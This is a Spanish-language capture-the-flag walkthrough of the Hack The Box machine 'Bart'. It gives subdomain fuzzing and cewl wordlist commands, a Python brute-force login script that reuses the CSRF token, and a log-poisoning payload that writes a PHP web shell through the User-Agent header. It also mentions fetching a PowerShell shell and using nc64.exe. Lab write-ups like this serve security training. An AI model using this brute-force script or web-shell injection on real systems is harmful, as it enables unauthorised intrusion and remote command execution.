# Bart-HTB

## NMAP 

![image](https://github.com/gecr07/Bart-HTB/assets/63270579/2d9d0c51-4e1f-49f5-a613-c08cf759eedf)

Ponermos en el hosts el subdominio "http://forum.bart.htb/"  Si vemos la pagina tiene varios usuarios (moraleja siempre revisa los comentatios html <!-- )

![image](https://github.com/gecr07/Bart-HTB/assets/63270579/1cc0bd8a-0fcd-4f13-bf6e-8a1939bdd22e)



## WFUZZ 

Vamos a enumerar en busca de otros subdominios

```bash
 wfuzz -c -t 200  --hc=302,404 -w /usr/share/seclists/Discovery/DNS/deepmagic.com-prefixes-top50000.txt -H "Host: FUZZ.bart.htb"  http://10.129.96.185/

```

Encontramos un subdominio nuevo "monitor"


![image](https://github.com/gecr07/Bart-HTB/assets/63270579/cc964f92-3d61-49a5-b8a0-419bf0651268)

Si lo revisamos no encontre nada entonces lo que se me ocurre es un ataque de fuerza bruta....

## CEWL

Esto sirve para crear diccionarios en base a las mismas palabras de la pagina.

```bash
cewl -w cewl-forum.txt -e -a http://forum.bart.htb

‐e, ‐‐email
                     Include email addresses.

 ‐a, ‐‐meta
                     Include meta data.


```


### TR Mayusculas a Minusculas

Para cambiar de mayusculas a minuculas

```bash
tr '[:upper:]' '[:lower:]'
```


## Brute Force Alternativa a cosas como Hydra

Esto es una alternativa a hydra para hacer brute force lo que si falta es ponerle hilos para que vaya mas rapido

```python
#!/usr/bin/python3

import requests, pdb, sys, time, re, signal
import urllib3, threading


def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


url = 'http://monitor.bart.htb/index.php'
burp = { 'http': 'http://127.0.0.1:8080'}



def main():
	#time.sleep(10)
	s=requests.session()
	r = s.get(url)
	#print(r.text)
	csrfToken = re.findall(r'name="csrf" value="(.*?)"',r.text)[0]
	#pdb.set_trace()# l y p para ver valores.


	with open("user.txt", "rb") as users_file:
		usuarios = [linea.decode().strip() for linea in users_file]
	with open("passwords.txt", "rb") as passwords_file:
		contraseñas = [linea.decode().strip() for linea in passwords_file]
		for usuario in usuarios:
			for contraseña in contraseñas:
				#print(f"Probando: Usuario={usuario}, Contraseña={contraseña}")
				post_data = {'csrf': csrfToken,'user_name': usuario,'user_password': contraseña,'action':'Login'}
				r = s.post(url,data=post_data,proxies=burp)
				if "The information is incorrect"  not in r.text:
					print(f"Se encontro una contraseña correcta {usuario}:{contraseña}")
		
		



if __name__ == '__main__':
	main()

```

COn el output de cewl y poniendo todo en minusculas sacamos el password

```
harvey

potter
```

![image](https://github.com/gecr07/Bart-HTB/assets/63270579/e3da1420-e251-40b5-bbf2-b5ced1ed2c9b)

Siemmpre ve si el proyecto es open source en este caso si.

![image](https://github.com/gecr07/Bart-HTB/assets/63270579/5b4852f0-526c-4c36-8e91-61fec50ae625)


Pues yo no hubiera podido ver esto solo pero si intentamos registranos de acuerdo al codigo.

![image](https://github.com/gecr07/Bart-HTB/assets/63270579/371da5fe-0627-4863-9074-ccb5c9ae1516)

```
curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d "uname=masa&password=masa1234"
```

![image](https://github.com/gecr07/Bart-HTB/assets/63270579/aa59b77e-66eb-4861-b411-2756aabec176)

![image](https://github.com/gecr07/Bart-HTB/assets/63270579/3ac269b9-79e1-40b5-8f32-24b3c626d805)


Si vemos el codigo vemos algo raro

![image](https://github.com/gecr07/Bart-HTB/assets/63270579/218edb21-ee54-4ac2-bdc8-e627b8089bd8)

Nos encontramos que esa pagina esta como capturando el user agent. Y aparte permite que creemoes un arhivo con lo cual se podria

```
http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey

```

### RCE (log poisoning)

Pues se puede hacer de varias maneras pero esta es con python y requests

```
import requests
proxies={'http':'http://127.0.0.1:8080'}
headers={'User-Agent':'MASA: <?php system($_GET['cmd']); ?>'}
r = requests.get('http://internal-01.bart.htb/log/log.php?filename=log1.php&username=harvey', proxies=proxies, headers=headers)

```

Ya sabes log1.php?cmd=descarga tu shell powershell nigsha...

![image](https://github.com/gecr07/Bart-HTB/assets/63270579/61bd98bd-74ba-4d75-bd86-e6b16b4da29b)

Siempre es importante pasarse a la arquitecura de 64 por lo que la manera mas facil por lo menos que yo he visto es nc64.exe. 












































